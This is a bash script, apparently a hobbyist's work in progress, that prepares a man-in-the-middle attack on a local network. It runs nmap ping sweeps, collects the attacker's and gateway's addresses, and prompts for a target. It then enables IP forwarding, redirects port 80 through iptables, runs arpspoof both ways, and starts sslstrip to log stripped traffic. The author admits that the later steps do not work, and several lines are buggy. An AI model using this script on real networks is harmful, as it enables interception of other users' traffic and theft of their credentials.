#!/bin/bash

#This dirty script will prep a Man in the Middle Attack.
#It will start by running 2 ping sweeps to get a general idea of what's on the net.
#It will then list the attacker's IP & MAC as well as the AP IP & MAC.
#Next, it will list all the hosts (targets) on the net and ask for a target IP.
#Not sure how far I want to take this as it is supposed to just set up an attack.
#I would like to at least take it to step 6. 8 is a nice must have.
#by, codeDirtyToMe

#To-do
#1. Read in the target IP
#2. ARP poisioning
#3. Modify IP tables for redirect
#4. Open 2 shells (Maybe tmux...) for arpspoofing
#5. SSL stripping
#6. tail the sslstrip.log for constant updates
#7. Spool up driftnet
#8. reset ipforwarding to 0 on close / exit
#9. Ask for interface device to run attack on.

#Determing the attacker's IP and MAC address.
ATTACKERIP=$(ifconfig | egrep 'inet addr' | cut -d":" -f2 | egrep -v '^127' | cut -d" " -f1)
#Need to do this better so that it's not specific to wireless device.
ATTACKERMAC=$(ifconfig | egrep -B 1 $ATTACKERIP | egrep HWaddr | sed 's/ //g' | cut -d"r" -f3)

#Next, we'll grab the access point IP and MAC address.
ACCESSPOINTIP=$(route | egrep default | cut -d"t" -f2 | cut -d"." -f1-4 | cut -d"0" -f1 | sed 's/ //g')

#run nmap ping sweep of network twice with a 5 second delay between sweeps.
for n in seq 2; do
   nmap -T4 -sP $ACCESSPOINTIP/24
   sleep 5s
done
#Wait 10 seconds for ARP table to reset otherwise I'll get a massive list of unassigned IP addresses.
clear

TIMER=10
while [ $TIMER -gt 0  ]; do
    printf "Standby. Waiting on the ARP table to get its shit together.\n"
    printf $TIMER
    TIMER=$(expr $TIMER - 1)
    sleep 1s
    clear
done

ACCESSPOINTMAC=$(arp -a | egrep -w $ACCESSPOINTIP | cut -d" " -f4)

printf "Yo' Self\n------------------------------\n"
printf "Your private IP is : $ATTACKERIP at $ATTACKERMAC"
printf "\nThe gateway IP is  : $ACCESSPOINTIP at $ACCESSPOINTMAC \n"

#List of targets minus the AP. Your own IP shouldn't show here regardless.
printf "\nTargets\n----------------------------------\n"
arp -a | cut -d" " -f2-4 | tr -d '()' | egrep -vw $ACCESSPOINTIP

#Prompt for target IP.
printf "\n----------------------------------\n"
TARGETIP=$(read -p "Enter the target IP: ")

#Test to make sure the user didn't put themselves as the target.
if [ $TARGETIP = $ATTACKERIP ]; then
    printf "\nWrong answer, bro."
    exit 1
fi

#!!!Nothing is working correctly after this point.!!!
###########################################################################################
#Set up IP forwarding
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward' #Has to be done this way on Ubuntu.

#Modify IP tables
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

#Open two shells running arpspoof.
gnome-terminal -e "bash -c arpspoof -i wlan0 -t ${TARGETIP} ${ACCESSPOINTIP}" #Assumes wireless connection.
gnome-terminal -e "bash -c arpspoof -i wlan0 -t ${ACCESSPOINTIP} ${TARGETIP}"

#Set up SSL stripping.
sslstrip -k -l 8080 -w ~/Desktop/sslstrip.log

#Set up terminal running a tail of the sslstrip.log
gnome-terminal -e "bash -c tail -F sslstrip.log"
    

exit 0
